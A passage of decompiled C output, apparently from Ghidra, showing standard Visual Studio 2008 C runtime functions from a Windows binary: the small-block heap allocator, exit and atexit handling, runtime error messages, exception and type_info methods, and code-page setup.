      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_004250f8 + DAT_004250f4 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_00425100;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_004250f8;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_00425100 && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_00425100) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_004250f8;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_00425100 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_00425100) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_00425100 = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0040f1da;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0040f1da:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_00423910)) && (local_8 == DAT_00425108)) {
    DAT_00423910 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_00422670);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_0041c380);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_0041c370);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040f2b9(void)

{
  __lock(8);
  return;
}



void FUN_0040f2c2(void)

{
  FUN_0040e64c(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  if (PTR___fpmath_00420458 != (undefined *)0x0) {
    BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_00420458);
    if (BVar1 != 0) {
      (*(code *)PTR___fpmath_00420458)(param_1);
    }
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_0041c258,(undefined **)&DAT_0041c270);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_00410cc4);
    __initterm((undefined **)&DAT_0041c254);
    if (DAT_004250f0 != (code *)0x0) {
      BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_004250f0);
      if (BVar1 != 0) {
        (*DAT_004250f0)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040f4ae)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_00423944 != 1) {
    _DAT_00423940 = 1;
    DAT_0042393c = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_004250e8);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)__decode_pointer(DAT_004250e4);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_004250e8);
            piVar6 = (int *)__decode_pointer(DAT_004250e4);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_0041c280);
    }
    __initterm((undefined **)&DAT_0041c288);
  }
  FUN_0040f4a8();
  if (param_3 == 0) {
    DAT_00423944 = 1;
    FUN_0040e64c(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040f4a8(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040e64c(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_0040f739(uVar1);
  FUN_00412feb(uVar1);
  FUN_0040b01c(uVar1);
  FUN_00414251(uVar1);
  FUN_00414242(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0041700a();
  __initp_eh_hooks();
  PTR___exit_00422670 = (undefined *)__encode_pointer(0x40f4d3);
  return;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_00422678)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_0042203c != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_00423948,0x314,s_Runtime_Error__Program__0041c940);
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_00423a65 = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_00423961,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_00423961,0x2fb,s_<program_name_unknown>_0041c928), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_00423961);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_00423961);
        eVar4 = _strncpy_s((char *)(sVar6 + 0x423926),
                           (int)&DAT_00423c5c - (int)(char *)(sVar6 + 0x423926),&DAT_0041c924,3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_00423948,0x314,&DAT_0041c920);
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_00423948,0x314,*(char **)(local_8 * 8 + 0x42267c));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_00423948,s_Microsoft_Visual_C___Runtime_Lib_0041c8f8,0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x42267c);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_0042203c != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_0040f739(undefined4 param_1)

{
  DAT_00423c5c = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_00423c5c);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = &PTR_FUN_0041c960;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = &PTR_FUN_0041c960;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = &PTR_FUN_0041c960;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = &PTR_FUN_0041c960;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



exception * __thiscall FUN_0040f860(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00409875(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = &PTR__scalar_deleting_destructor__0041c980;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_00409875(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_004250e8);
  piVar1 = (int *)__decode_pointer(DAT_004250e4);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_004250e8 = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_004250e4 = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040f2b9();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_0040f9f3();
  return p_Var1;
}



void FUN_0040f9f3(void)

{
  FUN_0040f2c2();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041c984;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_00422750 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00422750 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_0040fc68:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_0040fc68;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
